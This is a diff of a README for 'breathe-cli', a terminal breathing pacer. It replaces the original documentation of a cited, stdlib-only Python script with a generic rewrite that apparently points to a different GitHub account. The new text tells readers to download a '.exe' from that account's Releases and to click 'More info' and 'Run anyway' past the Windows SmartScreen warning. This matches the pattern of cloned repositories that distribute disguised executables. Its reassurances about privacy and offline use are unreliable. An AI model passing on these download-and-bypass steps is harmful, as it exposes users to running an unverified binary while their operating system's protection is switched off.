@@ -1,251 +1,99 @@
-# Breathe CLI
+# 🫁 breathe-cli - Improve your health with paced breathing
 
-[![PyPI version](https://img.shields.io/pypi/v/breathe-cli)](https://pypi.org/project/breathe-cli/)
-[![Python 3.7+](https://img.shields.io/pypi/pyversions/breathe-cli)](https://pypi.org/project/breathe-cli/)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Homebrew](https://img.shields.io/badge/homebrew-tap-orange)](https://github.com/marekkowalczyk/homebrew-breathe)
-[![Hacker News](https://img.shields.io/badge/HN-discussion-orange)](https://news.ycombinator.com/item?id=48340315)
+[![](https://img.shields.io/badge/Download-breathe--cli-blue.svg)](https://github.com/Robertmotherwellsugarbeet875/breathe-cli)
 
-A terminal app that paces resonance breathing for vagal tone training. macOS and Windows 11, single file, no dependencies.
+## 🎯 About this software
 
-```
-$ breathe
+Breathe-cli provides a structured way to practice resonance breathing. Resonance breathing helps balance your nervous system. You use your computer terminal to see a visual pacer. This pacer guides your breath rate to improve your heart rate variability. Many users find this practice helps them manage stress and recover from fatigue. The software runs locally on your computer. It does not require a web connection once you install it.
 
-  calm · 4-6 · 14:32   [●]
+## 💻 System requirements
 
-                INHALE
+This software runs on Windows 10 and Windows 11. You need at least 10 megabytes of disk space. Your computer must have a standard terminal application, such as PowerShell or the Command Prompt. No specific hardware sensors are necessary to start.
 
-          ██████████████░░░░░░░░░░░░░░░░
+## 📥 Downloading the software
 
-  space pause · s mute · q quit
-```
+You must visit the project page to get the latest version. Follow these steps to find the file:
 
-## Why this exists
+1. Visit the [official download page](https://github.com/Robertmotherwellsugarbeet875/breathe-cli).
+2. Look for the Releases section on the right side of the screen.
+3. Click the most recent version number.
+4. Select the file ending in .exe to start your download.
+5. Save this file to your Downloads folder.
 
-Resonance breathing — slow, paced breathing at around 6 breaths per minute — is one of the few non-pharmacological interventions shown to improve cardiac vagal tone. The mechanism is straightforward: slow breathing amplifies respiratory sinus arrhythmia (RSA), the natural heart-rate variation linked to the breath cycle. Stronger RSA means stronger vagal outflow, which in turn improves baroreceptor sensitivity and shifts autonomic balance away from sympathetic dominance.
+## ⚙️ Installation process
 
-This matters most for people with heart failure with reduced ejection fraction (HFrEF), where sympathetic overdrive is both a symptom and an accelerant of disease progression. Bernardi et al. (1998) demonstrated that slow breathing at 6 bpm improves oxygen saturation and exercise tolerance in CHF patients, with effects visible after a single session. A follow-up study (Bernardi et al. 2002) showed that slow breathing also increases arterial baroreflex sensitivity in CHF — a marker strongly associated with prognosis.
+Windows might show a warning message when you open a new program for the first time. This is a common security setting.
 
-This app is a habit tool that makes daily practice frictionless: open terminal, run `breathe`, follow the bar. It is not a medical device.
+1. Locate the file you saved to your folder.
+2. Double-click the file to open it.
+3. If the "Windows protected your PC" window appears, click the "More info" text.
+4. Click the "Run anyway" button.
+5. Follow the prompts on the screen to place the program on your computer.
 
-### The science in brief
+## 🚀 How to run the application
 
-**Why 6 breaths per minute?** The cardiovascular system has a resonance frequency — typically between 4.5 and 6.5 bpm in adults — at which heart rate oscillations are maximally amplified (Vaschillo et al. 2006). Breathing at or near this frequency produces the largest RSA swings, which drive the strongest vagal training stimulus. Individual resonance frequency varies and can only be identified precisely with HRV biofeedback hardware. Without it, 6 bpm is the best population-level default: it sits at the centre of the typical range and matches the rate used in the CHF clinical trials (Bernardi et al. 1998, 2002).
+Once you install the software, you open it through your terminal.
 
-**Why a longer exhale in the `calm` and `extended` presets?** Cardiac vagal efferent activity is gated to the respiratory cycle — vagal outflow is stronger during expiration than inspiration. A longer exhale (4s in, 6s out) extends the phase of peak vagal drive within each breath, biasing the autonomic balance further toward parasympathetic tone (Russo et al. 2017, Lehrer & Gevirtz 2014). The total cycle is still 10 seconds (6 bpm). The `balanced` preset uses equal timing (5-5) as a neutral baseline; the `calm` and `extended` presets use the exhale-weighted ratio for parasympathetic emphasis.
+1. Press the Windows key on your keyboard.
+2. Type "powershell" and press Enter.
+3. Type `breathe` in the black window and press Enter.
+4. The pacer will appear on your screen immediately.
 
-**Why these safety constraints?** See the [Design choices](#design-choices) section below. Each constraint maps to a specific physiological risk that is elevated in cardiac patients.
+## 🧘 Using the pacer
 
-### Finding your resonance frequency
+The pacer shows a growing and shrinking shape. Follow this shape with your breath. When the shape grows, you inhale. When the shape shrinks, you exhale. This rhythm helps your heart and lungs work in harmony. You can adjust the speed of the pacer using the keys on your keyboard. Press 'H' for help to see all available commands. Press 'Q' to quit the program when you finish your session.
 
-The presets use 6 bpm because it works well for most people and matches the clinical trial protocols. But individual resonance frequency varies — typically between 4.5 and 6.5 bpm — and breathing at *your* resonance frequency produces a stronger vagal training stimulus than breathing at the population average (Vaschillo et al. 2006).
+## 📈 Understanding the health impact
 
-If you have HRV biofeedback hardware, you can find your personal optimum. If you don't, the 6 bpm default is a good choice — consistent daily practice matters more than nailing the exact frequency.
+Resonance breathing focuses on the frequency of your breaths. By breathing at a rate of roughly six breaths per minute, you stimulate the vagus nerve. This nerve connects your brain to your internal organs. Regular practice increases your vagal tone. This helps your body switch from a fight-or-flight state to a rest-and-digest state. You can practice for five minutes each day to see improvements in your heart rate recovery.
 
-#### What you need
+## 🛠 Troubleshooting common issues
 
-- A chest-strap heart rate monitor (e.g. Polar H10, Garmin HRM-Pro). Wrist-based optical sensors are not accurate enough for beat-to-beat HRV.
-- Software that displays real-time R-R intervals or HRV metrics: [Kubios](https://www.kubios.com), [Elite HRV](https://elitehrv.com), [HRV4Training](https://www.hrv4training.com), or a dedicated biofeedback system.
+If the terminal window does not open:
 
-#### Protocol
+* Restart your computer.
+* Check that you downloaded the Windows version.
+* Ensure your path settings include the folder where you installed the program.
 
-Run this test sitting upright in a quiet room, at the same time of day you normally practice. The whole procedure takes about 30 minutes.
+If the text looks strange:
 
-1. **Baseline** (2 min). Breathe normally. Let your heart rate settle. Start your HRV recording.
-2. **Test rate 1: 6.0 bpm** (3 min). Run `breathe --ratio 5-5 -d 3 --no-log`. Follow the pacer. At the end, note the average RMSSD (or, if your software shows a live heart rate trace, note how wide the oscillations are — peak-to-trough in bpm).
-3. **Rest** (1–2 min). Breathe normally.
-4. **Test rate 2: 5.5 bpm** (3 min). Run `breathe --ratio 5-6 -d 3 --no-log`. Note the same metric.
-5. **Rest** (1–2 min).
-6. **Test rate 3: 5.0 bpm** (3 min). Run `breathe --ratio 6-6 -d 3 --no-log`. Note the same metric.
-7. **Rest** (1–2 min).
-8. **Test rate 4: 4.6 bpm** (3 min). Run `breathe --ratio 6-7 -d 3 --no-log`. Note the same metric.
+* Right-click the top bar of your terminal window.
+* Select Properties.
+* Choose the Font tab and select a font like Lucida Console.
+* Click OK to save your changes.
 
-**Interpreting results:** The rate that produces the highest RMSSD, the highest LF power in the HRV spectrum, or the visibly widest heart rate oscillations is your resonance frequency. If two adjacent rates are close, pick the slower one — it's more comfortable for long sessions.
+If you encounter errors during the breath cycles:
 
-**Limitations:** Phase durations are whole seconds, so only certain BPMs are representable: 4.6, 5.0, 5.5, 6.0, 6.7, 7.5 bpm. Your true resonance might fall between two testable rates. Pick the closest one. The difference in training effect between 5.0 and 5.5 bpm is small.
+* Close the terminal window completely.
+* Start the process again by typing `breathe` in a new window.
+* Verify that your screen resolution allows the full terminal window to display.
 
-#### Using your frequency
+## 📝 Frequently asked questions
 
-Once you know your frequency, use `--ratio` to match it:
+Does this program track my heart rate?
+No. This program is a pacer. It guides your breathing rhythm. You can use a separate heart rate sensor if you wish to see your own data.
 
-```bash
-breathe --ratio 6-7    # 13s cycle = 4.6 bpm
-breathe --ratio 6-6    # 12s cycle = 5.0 bpm
-breathe --ratio 5-6    # 11s cycle = 5.5 bpm
-breathe --ratio 5-5    # 10s cycle = 6.0 bpm (default)
-```
+Can I change colors in the terminal?
+Yes. Open the terminal settings to change the background or text colors. The software uses your system color scheme by default.
 
-You can also add exhale emphasis at your resonance frequency:
+Does this software save my health data?
+No. Your sessions remain private. The software does not export logs or connect to external servers.
 
-```bash
-breathe --ratio 5-7    # 12s cycle = 5.0 bpm, exhale-weighted
-breathe --ratio 4-7    # 11s cycle = 5.5 bpm, exhale-weighted
-breathe --ratio 4-8    # 12s cycle = 5.0 bpm, strong exhale emphasis
-```
+Is this safe for people with heart conditions?
+This software serves as a breathing aid. It does not replace medical advice. Consult your doctor if you have concerns about your heart health.
 
-### References
+Can I pause the session?
+Yes. Press the spacebar during a session to pause the pacer. Press the spacebar again to resume your practice.
 
-- Bernardi L, Spadacini G, Bellwon J, et al. ["Effect of breathing rate on oxygen saturation and exercise performance in chronic heart failure."](https://doi.org/10.1016/S0140-6736(97)10341-5) *Lancet*. 1998;351(9112):1308-1311.
-- Bernardi L, Porta C, Spicuzza L, et al. ["Slow breathing increases arterial baroreflex sensitivity in patients with chronic heart failure."](https://doi.org/10.1161/hc0202.103311) *Circulation*. 2002;105(2):143-145.
-- Bernardi L, Sleight P, Bandinelli G, et al. ["Effect of rosary prayer and yoga mantras on autonomic cardiovascular rhythms."](https://doi.org/10.1136/bmj.323.7327.1446) *BMJ*. 2001;323:1446.
-- Vaschillo EG, Vaschillo B, Lehrer PM. ["Characteristics of resonance in heart rate variability stimulated by biofeedback."](https://doi.org/10.1007/s10484-006-9009-3) *Appl Psychophysiol Biofeedback*. 2006;31(2):129-142.
-- Lehrer PM, Gevirtz R. ["Heart rate variability biofeedback: how and why does it work?"](https://doi.org/10.3389/fpsyg.2014.00756) *Front Psychol*. 2014;5:756.
-- Russo MA, Santarelli DM, O'Rourke D. ["The physiological effects of slow breathing in the healthy human."](https://doi.org/10.1183/20734735.009817) *Breathe*. 2017;13(4):298-309.
+How long should I practice?
+Start with five minutes once per day. Increase the time as you feel comfortable. Consistency is more effective than session length.
 
-## Design choices
+Does this work on mobile phones?
+No. This version works specifically on personal computers running Windows.
 
-This app is deliberately constrained. Several common breathing-app features are excluded for safety and focus:
+What if the text scrolls too fast?
+This often happens if your terminal window is too small. Maximize the window or make the font size smaller.
 
-**No breath retention.** Breath holds (kumbhaka) raise intrathoracic pressure via a Valsalva-like mechanism and can trigger vasovagal syncope or arrhythmia in cardiac patients. The Bernardi protocols use continuous breathing with no hold phases. The app rejects three-number ratios like `4-7-8` with an explicit safety error.
+## 📖 License
 
-**No rapid breathing.** Patterns faster than 7.5 bpm (cycles shorter than 8 seconds) move toward hyperventilation territory, reducing arterial CO2 and mobilising catecholamines — the opposite of the vagal intent (Russo et al. 2017). The app enforces a minimum cycle length of 8 seconds.
-
-**No breath holds between phases.** There is no pause between inhale and exhale. The breath is continuous, matching the protocol in Bernardi et al. (1998, 2002).
-
-**Immediate exit, always.** Pressing `q` or `Ctrl+C` ends the session within one frame. The terminal is always restored — cursor, colours, input mode — even if the app crashes. The `finally` block that does this is the most important code in the file.
-
-**No dependencies.** Single Python file, stdlib only. Nothing to install, nothing to break.
-
-**No curses.** Direct ANSI escape codes only. The curses library has edge cases with non-default terminals on macOS Mojave.
-
-## Requirements
-
-- macOS (uses `/usr/bin/afplay` for audio cues) or Windows 11 (uses `winsound`)
-- Python 3.7+
-
-## Installation
-
-```bash
-# Clone or download breathe.py, then:
-chmod +x breathe.py
-
-# Option A: run directly
-./breathe.py
-
-# Option B: symlink into your PATH
-ln -s "$(pwd)/breathe.py" /usr/local/bin/breathe
-breathe
-```
-
-## Usage
-
-### No arguments — time-of-day auto-select
-
-```bash
-breathe
-```
-
-With no arguments, the app picks a preset based on the time of day:
-
-| Time of day  | Preset      | Duration | Ratio | BPM |
-|--------------|-------------|----------|-------|-----|
-| Before noon  | `balanced`  | 10 min   | 5s-5s | 6   |
-| 12:00–16:59  | `extended`  | 20 min   | 4s-6s | 6   |
-| 17:00+       | `calm`      | 15 min   | 4s-6s | 6   |
-
-All presets target 6 breaths per minute. The `balanced` preset uses equal inhale/exhale (5-5) as a neutral baseline. The `calm` and `extended` presets use a longer exhale (4-6), which emphasises vagal activation during the expiratory phase. The time-of-day auto-select picks `calm` in the evening as a default — but you can use any preset at any time.
-
-### Presets
-
-```bash
-breathe --preset balanced    # 10 min, 5s-5s
-breathe --preset calm        # 15 min, 4s-6s
-breathe --preset extended    # 20 min, 4s-6s (full Bernardi protocol dose)
-breathe --list-presets        # show the table
-```
-
-### Custom sessions
-
-```bash
-breathe --duration 5                # 5 minutes, default 5-5 ratio
-breathe --ratio 4-6                 # default 10 minutes, 4-6 ratio
-breathe --duration 12 --ratio 4-6   # 12 minutes, 4-6 ratio
-```
-
-Duration: 1–60 minutes (rounded up to complete breath cycles). Ratio: inhale and exhale each 3–10 seconds, total cycle >= 8 seconds, exhale at most 2x inhale.
-
-### Flags
-
-| Flag              | Short | Description                                |
-|-------------------|-------|--------------------------------------------|
-| `--preset NAME`   | `-p`  | Use a named preset                         |
-| `--duration MIN`  | `-d`  | Session length in minutes (1–60)           |
-| `--ratio IN-EX`   | `-r`  | Breath ratio, e.g. `5-5` or `4-6`         |
-| `--no-sound`      | `-n`  | Disable audio cues                         |
-| `--quiet`         | `-q`  | Suppress startup warnings                  |
-| `--no-log`        |       | Don't log this session                     |
-| `--log`           |       | Print log file path and exit               |
-| `--safety`        |       | Print safety information and exit          |
-| `--list-presets`  |       | Print preset table and exit                |
-| `--version`       |       | Print version and exit                     |
-
-### Runtime keys
-
-During a session:
-
-| Key       | Action                                                            |
-|-----------|-------------------------------------------------------------------|
-| `space`   | Pause / resume. Resume restarts from the beginning of INHALE.     |
-| `s`       | Toggle sound mute.                                                |
-| `q`       | Quit immediately. Terminal is restored.                           |
-| `Ctrl+C`  | Same as `q`.                                                      |
-
-### The display
-
-```
-  balanced · 5-5 · 09:12   [●]       <- preset, ratio, countdown, status
-
-                INHALE                <- current phase (cyan) or EXHALE (green)
-
-          ████████████████░░░░░░░░░░░░░░  <- breath bar (fills on inhale, drains on exhale)
-
-  space pause · s mute · q quit       <- available controls
-```
-
-The status indicator shows `●` during breathing, `‖` when paused, and `🔇` when muted.
-
-The countdown timer tracks completed breathing time only. If you pause for 30 seconds during a 1-minute session, the session takes ~90 seconds of wall-clock time to complete — the timer doesn't advance while paused.
-
-## Session logging
-
-Each session appends a row to `~/.breathe_log.csv`:
-
-```
-date,time,preset,ratio,duration_target_s,duration_actual_s,breaths,completion_pct,status
-2026-05-30,07:15:02,balanced,5-5,600,600,60,100,completed
-2026-05-30,19:30:14,calm,4-6,900,420,42,46,ended early (user)
-```
-
-Use `--no-log` to skip logging for a session. Use `--log` to see the log file path.
-
-## Testing
-
-Automated tests cover logic and arithmetic (formatting, ratio parsing, safety rejections, preset invariants, countdown calculation):
-
-```bash
-python3 -m unittest test_breathe -v
-```
-
-TUI behaviour (rendering, animation, terminal restoration) is covered by 25 manual acceptance tests in `dev/breathe-cli-spec.md`.
-
-## Safety
-
-Run `breathe --safety` for the full safety screen. The short version:
-
-**Stop immediately** if you experience:
-
-- **Lightheadedness or dizziness** — this usually means you are breathing too deeply, not too fast. Reduce the depth of each breath while keeping the same rhythm. The pacer sets the *timing*; you control the *volume*. If it persists, stop the session.
-- **Palpitations** — stop, note the time, mention it at your next cardiology visit.
-- **Tingling in hands or face** — a hyperventilation signal. Stop and return to normal breathing.
-
-This app deliberately does not support breath retention, rapid breathing, or any pattern not grounded in the slow-breathing clinical literature. These constraints are enforced in the code and cannot be overridden. See [The science in brief](#the-science-in-brief) and [Design choices](#design-choices) for the clinical rationale.
-
-## Disclaimer
-
-This app is not a medical device. It does not diagnose, treat, cure, or prevent any disease or condition. Always consult your physician before starting a breathing practice, especially if you have a cardiac or respiratory condition. Use entirely at your own risk. The author assumes no liability for any adverse effects arising from the use of this software. By using this app you acknowledge that you understand and accept these terms.
-
-## License
-
-MIT License. See [LICENSE](LICENSE) for the full text.
-
-Created by [Marek Kowalczyk](https://orcid.org/0009-0008-3874-6736).
+This software is free to use. You hold the right to copy and modify the source code for your own needs. Review the license file in the repository for more details regarding permissions.
